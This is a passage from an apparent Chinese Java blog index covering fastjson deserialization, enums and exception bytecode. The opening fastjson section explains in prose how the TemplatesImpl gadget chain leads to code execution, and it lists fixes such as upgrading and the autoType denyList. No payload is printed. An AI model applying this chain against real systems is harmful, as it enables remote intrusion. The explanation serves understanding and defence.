&#125;</code>，fastjson会调用其中无参构造函数得到<code>_tfactory</code>，这就避免了部分版本中<code>defineTransletClasses</code>使用了<code>_tfactory</code>导致异常。</p>\n<p>序列化流程分析：<br>1、fastjson反序列化json，对序列化对象进行赋值。<code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue</code><br>2、调用<code>TemplatesImpl.getOutputProperties</code><br>3、创建Transformer<br>4、<code>TemplatesImpl.getTransletInstance</code>，在该处有创建<code>_class</code>，通过获取<code>_bytecodes</code>中的字节加载类。<br>5、创建加载类的对象，这时就会执行创建对象时我们设置的危险代码。</p>\n<p>这里之前好奇为什么在反序列化的时候，会调用<code>TemplatesImpl.getOutputProperties</code>，在对代码进行debug时发现，<code>com.alibaba.fastjson.util.JavaBeanInfo 505行</code>会判断该类中的所有方法，判断get方法，同时判断返回值是否指定的类型，如果如果是指定的类型，会保存该方法，在保存前会检查该属性是否已经保存过（set方法，如果有set方法那么在之前就已经保存），如果已经保存过该方法，那么就会<code>continue</code>，那么也就不会保存该get方法。在后续设置值是，就会通过上述保存的方法设置值（set &gt; get）。这样也就可以解释为什么会调用<code>TemplatesImpl.getOutputProperties</code>，因为<code>_outputProperties</code>没有set方法只有get。</p>\n<h5 id=\"fastjson漏洞解决办法\"><a href=\"#fastjson漏洞解决办法\" class=\"headerlink\" title=\"fastjson漏洞解决办法\"></a>fastjson漏洞解决办法</h5><p>更新版本1.2.28&#x2F;1.2.29&#x2F;1.2.30&#x2F;1.2.31或者更新版本。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvZmFzdGpzb24vd2lraS9zZWN1cml0eV91cGRhdGVfMjAxNzAzMTU=\">安全升级公告<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>fastjson更新能够解决。</p>\n<p>fastjson解决方式：<br>autoTypeSupport默认关闭，需要手动打开，<code>com.alibaba.fastjson.parser.ParserConfig#autoTypeSupport</code><br>设置黑名单，禁止部分包通过<code>autoType</code>进行反序列化。<code>com.alibaba.fastjson.parser.ParserConfig#denyList</code><br>具体fastjson更新代码地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvZmFzdGpzb24vY29tbWl0L2Q1MjA4NWVmNTRiMzJkZmQ5NjMxODZlNTgzY2JjZGZmZjVkMTAxYjU=\">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5<i class=\"fa fa-external-link-alt\"></i></span></p>\n<ul>\n<li>参考资料：<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNoYWl0aW4uY24vMjAxNS0xMS0xMV9qYXZhX3Vuc2VyaWFsaXplX3JjZS8=\">Lib之过？Java反序列化漏洞通用利用分析<i class=\"fa fa-external-link-alt\"></i></span><br><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9qYXZhL2otbG8tc2VyaWFsLw==\">Java 序列化的高级认识<i class=\"fa fa-external-link-alt\"></i></span><br><span class=\"exturl\" data-url=\"aHR0cDovL3h4bGVnZW5kLmNvbS8yMDE3LzA0LzI5L3RpdGxlLSUyMGZhc3Rqc29uJTIwJUU4JUJGJTlDJUU3JUE4JThCJUU1JThGJThEJUU1JUJBJThGJUU1JTg4JTk3JUU1JThDJTk2cG9jJUU3JTlBJTg0JUU2JTlFJTg0JUU5JTgwJUEwJUU1JTkyJThDJUU1JTg4JTg2JUU2JTlFJTkwLw==\">fastjson 远程反序列化poc的构造和分析<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["Java基础"],"tags":["基础","序列化"]},{"title":"Java基础-枚举","url":"/2018/03/23/Java%E5%9F%BA%E7%A1%80-%E6%9E%9A%E4%B8%BE/","content":"<p>JDK1.5新增了枚举类型，定义一个枚举如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    MONDAY(<span class=\"number\">1</span>, <span class=\"string\">&quot;星期一&quot;</span>),</span><br><span class=\"line\">    TUESDAY(<span class=\"number\">2</span>, <span class=\"string\">&quot;星期二&quot;</span>),</span><br><span class=\"line\">    WEDNESDAY(<span class=\"number\">3</span>, <span class=\"string\">&quot;星期三&quot;</span>),</span><br><span class=\"line\">    THURSDAY(<span class=\"number\">4</span>, <span class=\"string\">&quot;星期四&quot;</span>),</span><br><span class=\"line\">    FRIDAY(<span class=\"number\">5</span>, <span class=\"string\">&quot;星期五&quot;</span>),</span><br><span class=\"line\">    SATURDAY(<span class=\"number\">6</span>, <span class=\"string\">&quot;星期六&quot;</span>),</span><br><span class=\"line\">    SUNDAY(<span class=\"number\">7</span>, <span class=\"string\">&quot;星期日&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> num;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    Main(<span class=\"type\">int</span> num, String name) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.num = num;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getNum</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> num;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>通过命令<code>javap -p</code>查看编译后的class如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Compiled from &quot;Main.java&quot;</span><br><span class=\"line\">public final class Main extends java.lang.Enum&lt;Main&gt; &#123;</span><br><span class=\"line\">  public static final Main MONDAY;</span><br><span class=\"line\">  public static final Main TUESDAY;</span><br><span class=\"line\">  public static final Main WEDNESDAY;</span><br><span class=\"line\">  public static final Main THURSDAY;</span><br><span class=\"line\">  public static final Main FRIDAY;</span><br><span class=\"line\">  public static final Main SATURDAY;</span><br><span class=\"line\">  public static final Main SUNDAY;</span><br><span class=\"line\">  public int num;</span><br><span class=\"line\">  public java.lang.String name;</span><br><span class=\"line\">  private static final Main[] $VALUES;</span><br><span class=\"line\">  public static Main[] values();</span><br><span class=\"line\">  public static Main valueOf(java.lang.String);</span><br><span class=\"line\">  private Main(int, java.lang.String);</span><br><span class=\"line\">  public int getNum();</span><br><span class=\"line\">  public java.lang.String getName();</span><br><span class=\"line\">  static &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从反编译的代码可以看出：<br>1、最终生成的是final修饰类，<code>java.lang.Enum</code>的子类<br>2、之前定义的枚举变为了当前类的对象<br>3、构造方法是私有的<br>4、新增values、valueOf方法</p>\n<p>通过类通过final修饰禁止继承，提前定义好相应的对象，private修饰构造方法禁止创建新的对象。</p>\n<p>在创建枚举类时，会调用父类Enum构造方法，传入枚举的名称、枚举的序数（用于查看枚举声明的数组中的位置）。<br>Enum因为实现了Comparable类，所以枚举可以进行比较，看源码得知先比较的是某个类，之后比较是枚举的序数是否相等。</p>\n<p>枚举抽象方法用法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    SATURDAY() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doSomething</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;nothing&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    SUNDAY() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doSomething</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;nothing&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doSomeThing</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过定义一个抽象方法，然后在定义枚举是需要实现改方法（反编译后生成的类为抽象类，枚举值为其内部类），既然是类，那么如果定义的是普通方法，那么可以重写定义的方法。</p>\n<p>枚举因为编译器最终生成的是类，在Java中不支持多继承（已经继承java.lang.Enum），但是可以实现接口，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">IDeme</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">doSomething</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> <span class=\"title class_\">Main</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">IDeme</span> &#123;</span><br><span class=\"line\">    SATURDAY() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doSomething</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;nothing&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    SUNDAY() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doSomething</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;nothing&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>枚举除了在定义唯一的属性，同时在使用单例设计模式时，保证了唯一性。<br>普通的单例在通过序列化、反序列化时，可以生成一个新的对象（通过添加readResolve方法来解决该问题）；也可以通过反射来强行调用私有构造方法生成新的对象。</p>\n<p>在对枚举序列化和反序列化过程中，仅仅是把枚举对象的name序列化，反序列化的时候是通过Enum.valueOf()来通过name找到对应的对象。同时编译器不允许对这种序列化机制做定制，所有禁用了writeObject、readObject、readObjectNoData、writeReplace和readResolve等方法。<br>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzcvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvc2VyaWFsLWFyY2guaHRtbA==\">1.12 Serialization of Enum Constants<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>举例如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">IDeme</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">doSomething</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> <span class=\"title class_\">Main</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">IDeme</span> &#123;</span><br><span class=\"line\">    SATURDAY() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doSomething</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;nothing&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    SUNDAY() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doSomething</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;nothing&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span><span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(System.out);</span><br><span class=\"line\">        <span class=\"type\">Main</span> <span class=\"variable\">saturday</span> <span class=\"operator\">=</span> Main.SATURDAY;</span><br><span class=\"line\">        objectOutputStream.writeObject(saturday);</span><br><span class=\"line\">        <span class=\"comment\">//输出类似 乱码com.whh.netty.Main乱码java.lang.Enum乱码xptSATURDAY</span></span><br><span class=\"line\">        objectOutputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从上面可以依稀看出最后是SATURDAY字符串，可以通过验证反序列化比较是否一致。<br>Enum.valueOf如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T <span class=\"keyword\">extends</span> <span class=\"title class_\">Enum</span>&lt;T&gt;&gt; T <span class=\"title function_\">valueOf</span><span class=\"params\">(Class&lt;T&gt; enumType,</span></span><br><span class=\"line\"><span class=\"params\">                                            String name)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">T</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> enumType.enumConstantDirectory().get(name);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (result != <span class=\"literal\">null</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (name == <span class=\"literal\">null</span>)</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NullPointerException</span>(<span class=\"string\">&quot;Name is null&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalArgumentException</span>(</span><br><span class=\"line\">        <span class=\"string\">&quot;No enum constant &quot;</span> + enumType.getCanonicalName() + <span class=\"string\">&quot;.&quot;</span> + name);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过传入的类调用enumConstantDirectory，该方法返回枚举名字的常量（其实就是反射获取枚举类中values返回枚举中定义的数组），通过key或获取到对应的枚举值。这样就保证枚举返回的事唯一值。</p>\n<p>通过反射创建新枚举：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    SATURDAY,</span><br><span class=\"line\">    SUNDAY;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        Constructor&lt;Main&gt; declaredConstructor = Main.class.getDeclaredConstructor(String.class, <span class=\"type\">int</span>.class);</span><br><span class=\"line\">        declaredConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Main</span> <span class=\"variable\">test</span> <span class=\"operator\">=</span> declaredConstructor.newInstance(<span class=\"string\">&quot;test&quot;</span>, <span class=\"number\">11</span>);<span class=\"comment\">//Cannot reflectively create enum objects</span></span><br><span class=\"line\">        System.out.println(test);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>打开Constructor.newInstance源码看到</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ((clazz.getModifiers() &amp; Modifier.ENUM) != <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalArgumentException</span>(<span class=\"string\">&quot;Cannot reflectively create enum objects&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>如果是枚举类型会直接抛出异常。</p>\n<p>在使用枚举过程中，还有EnumSet、EnumMap辅助类帮助快速使用，EnumSet使用了位向量，后续位运算时分析。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmF6ZWppYW4vYXJ0aWNsZS9kZXRhaWxzLzcxMzMzMTAz\">深入理解Java枚举类型(enum)<i class=\"fa fa-external-link-alt\"></i></span></p>\n","categories":["Java基础"],"tags":["基础","枚举"]},{"title":"Java基础-异常","url":"/2018/03/27/Java%E5%9F%BA%E7%A1%80-%E5%BC%82%E5%B8%B8/","content":"<p>在程序中经常会出现各种错误，在Java中可以通过异常进行展现出来。<br>在处理异常时，常用的关键字有：try、catch、finally、throw、throws；<br>try：通过会出现异常的代码块可以放入try代码块中，用于监听代码块中的是否会出现异常。<br>catch：通常用于捕获try代码块中出现的异常，用于发生异常捕获后做相关操作。<br>finally：用于try代码块执行完毕后，必须执行的地方，比如出现IOException后用于关闭连接，就算出现异常，finally也会执行。<br>throw：用于程序手动抛出异常。<br>throws：用于方法后，标识方法可能会出现异常。</p>\n<p>在Java中异常分为两大类：Error、Exception。<br>Error：用来表示编译时和系统错误，出现这种错误时一般比较严重，一般有JVM抛出。<br>Exception：由程序本身可以处理的异常。</p>\n<p>异常又可以分为：可检测异常、非检测异常<br>可检测异常：正确的程序在运行中，很容易出现的、情理可容的异常状况。编译器在编译代码时会检测该异常。一旦出现该异常，必须进行处理，也就是要么try…catch，要么throw抛出异常到上一层，由上层处理，如果一直上抛，最终会抛出到JVM层，最终导致JVM停止。除RuntimeException及其子类以外都是该异常，典型的如IOException。<br>非检测异常：这种异常并不会直接被编译器所检测，RuntimeException及其子类和Error。</p>\n<span id=\"more\"></span>\n<p>除去Error，只看Exception分为运行时异常和非运行时异常：<br>运行时异常：和非检测异常一样，只是排除Error，都是RuntimeException及其子类。<br>非运行时异常：除RuntimeException及其子类以外的异常。</p>\n<p>常见的异常关系继承图如下：<br><img src=\"/images/old/20180328%E5%BC%82%E5%B8%B8%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%9B%BE.jpg\"></p>\n<h1 id=\"异常流程\"><a href=\"#异常流程\" class=\"headerlink\" title=\"异常流程\"></a>异常流程</h1><p>编写代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        System.out.println(ex());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">ex</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>/<span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">           <span class=\"comment\">// return 1;</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>javap -v -l -p -c Main.class</code>反编译后只看部分代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public static int ex();</span><br><span class=\"line\">descriptor: ()I</span><br><span class=\"line\">flags: ACC_PUBLIC, ACC_STATIC</span><br><span class=\"line\">Code:</span><br><span class=\"line\">    stack=3, locals=2, args_size=0</span><br><span class=\"line\">    0: iconst_1</span><br><span class=\"line\">    1: iconst_0</span><br><span class=\"line\">    2: idiv</span><br><span class=\"line\">    3: istore_0</span><br><span class=\"line\">    4: iconst_0</span><br><span class=\"line\">    5: ireturn</span><br><span class=\"line\">    6: astore_0</span><br><span class=\"line\">    7: new           #6                  // class java/lang/RuntimeException</span><br><span class=\"line\">    10: dup</span><br><span class=\"line\">    11: ldc           #7                  // String aaa</span><br><span class=\"line\">    13: invokespecial #8                  // Method java/lang/RuntimeException.&quot;&lt;init&gt;&quot;:(Ljava/lang/String;)V</span><br><span class=\"line\">    16: athrow</span><br><span class=\"line\">    17: astore_1</span><br><span class=\"line\">    18: iconst_0</span><br><span class=\"line\">    19: ireturn</span><br><span class=\"line\">    Exception table:</span><br><span class=\"line\">        from    to  target type</span><br><span class=\"line\">            0     4     6   Class java/lang/Exception</span><br><span class=\"line\">            0     4    17   any</span><br><span class=\"line\">            6    18    17   any</span><br><span class=\"line\">    LineNumberTable:</span><br><span class=\"line\">    line 8: 0</span><br><span class=\"line\">    line 13: 4</span><br><span class=\"line\">    line 9: 6</span><br><span class=\"line\">    line 11: 7</span><br><span class=\"line\">    line 13: 17</span><br><span class=\"line\">    StackMapTable: number_of_entries = 2</span><br><span class=\"line\">    frame_type = 70 /* same_locals_1_stack_item */</span><br><span class=\"line\">        stack = [ class java/lang/Exception ]</span><br><span class=\"line\">    frame_type = 74 /* same_locals_1_stack_item */</span><br><span class=\"line\">        stack = [ class java/lang/Throwable ]</span><br></pre></td></tr></table></figure>\n<p>上述代码中可以看Exception table中 <code>0~4</code>行如果抛出了<code>java/lang/Exception</code>异常，那么转跳到第6行，<code>0~4</code>如果发生了其他异常转跳到17行，如果<code>6~18</code>行发生其他异常转跳17行。</p>\n<p>上述代码中try包含的代码块就是反编译后<code>0~4</code>行，转到第6行为catch异常代码，其中我们是throw一个异常，其实就是创建一个异常对象，然后执行<code>athrow</code>命令，之后去异常表里面查找是否存在异常处理，之后转跳到17行，继续执行然后返回。</p>\n<p>这里就可以看出上述代码，并不会抛出<code>RuntimeException</code>，直接返回finlly中的值。</p>\n<p>如果修改代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        System.out.println(ex());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">ex</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>/<span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;finally&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>反编译后得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public static int ex();</span><br><span class=\"line\">descriptor: ()I</span><br><span class=\"line\">flags: ACC_PUBLIC, ACC_STATIC</span><br><span class=\"line\">Code:</span><br><span class=\"line\">    stack=3, locals=2, args_size=0</span><br><span class=\"line\">    0: iconst_1</span><br><span class=\"line\">    1: iconst_0</span><br><span class=\"line\">    2: idiv</span><br><span class=\"line\">    3: istore_0</span><br><span class=\"line\">    4: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class=\"line\">    7: ldc           #5                  // String finally</span><br><span class=\"line\">    9: invokevirtual #6                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class=\"line\">    12: goto          37</span><br><span class=\"line\">    15: astore_0</span><br><span class=\"line\">    16: new           #8                  // class java/lang/RuntimeException</span><br><span class=\"line\">    19: dup</span><br><span class=\"line\">    20: ldc           #9                  // String aaa</span><br><span class=\"line\">    22: invokespecial #10                 // Method java/lang/RuntimeException.&quot;&lt;init&gt;&quot;:(Ljava/lang/String;)V</span><br><span class=\"line\">    25: athrow</span><br><span class=\"line\">    26: astore_1</span><br><span class=\"line\">    27: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class=\"line\">    30: ldc           #5                  // String finally</span><br><span class=\"line\">    32: invokevirtual #6                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class=\"line\">    35: aload_1</span><br><span class=\"line\">    36: athrow</span><br><span class=\"line\">    37: iconst_1</span><br><span class=\"line\">    38: ireturn</span><br><span class=\"line\">    Exception table:</span><br><span class=\"line\">        from    to  target type</span><br><span class=\"line\">        0     4    15   Class java/lang/Exception</span><br><span class=\"line\">        0     4    26   any</span><br><span class=\"line\">        15    27    26   any</span><br></pre></td></tr></table></figure>\n<p>反编译后<code>0~4</code>中如果出现异常转跳到15，如果<code>15~27</code>中出现异常转跳26，在<code>15~27</code>为catch中语句，创建RuntimeException对象，然后<code>athrow</code>抛出异常，转跳到26，执行finally语句。之后代码继续执行，可以看到在36处有个<code>athrow</code>，但是在异常表中并没有该处异常处理，所以异常会被抛出。</p>\n<p>在java中通过<code>方法调用栈</code>来跟踪线程调用一系列方法调用过程，改栈堆保存了每个调用方法的本地信息（比如方法的局部变量）。每个线程都有一个独立的方法调用栈。每当一个新方法被调用时，Java虚拟机把描述该方法的栈结构置入栈顶，位于栈顶的方法为正在执行的方法。方法执行完毕后该方法会被弹出栈顶。如果在方法中出现异常，且异常表中没有该异常处理，在异常抛出后，虚拟机会从方法栈中弹出该方法，然后在前一个调用方法处查询是否有该异常处理，如果一直没有就会一直追溯到调用栈底部，这时会如下处理：<br>1、调用异常对象的printStackTrace()方法，打印来自方法调用栈的异常信息。<br>2、如果该线程不是主线程，那么终止这个线程，其他线程继续正常运行。如果该线程是主线程（即方法调用栈的底部为main()方法），那么整个应用程序被终止。</p>\n<ul>\n<li><code>Thread.currentThread().getStackTrace()</code>可以打印当前方法调用栈。</li>\n</ul>\n<p>更多异常知识：<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9qYXZhL2otbG8tZXhjZXB0aW9uLW1pc2RpcmVjdGlvbi8=\">Java 异常处理的误区和经验总结<i class=\"fa fa-external-link-alt\"></i></span><br><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9qYXZhL2otbG8tZXhjZXB0aW9uL2luZGV4Lmh0bWw=\">Java 异常处理及其应用<i class=\"fa fa-external-link-alt\"></i></span><br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTA0MTI3MTkvYXJ0aWNsZS9kZXRhaWxzLzUwMDQzODY1\">从字节码的角度来看try-catch-finally和return的执行顺序<i class=\"fa fa-external-link-alt\"></i></span><br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RueHlod3gvYXJ0aWNsZS9kZXRhaWxzLzY5NzUwODc=\">java学习笔记《面向对象编程》——异常处理<i class=\"fa 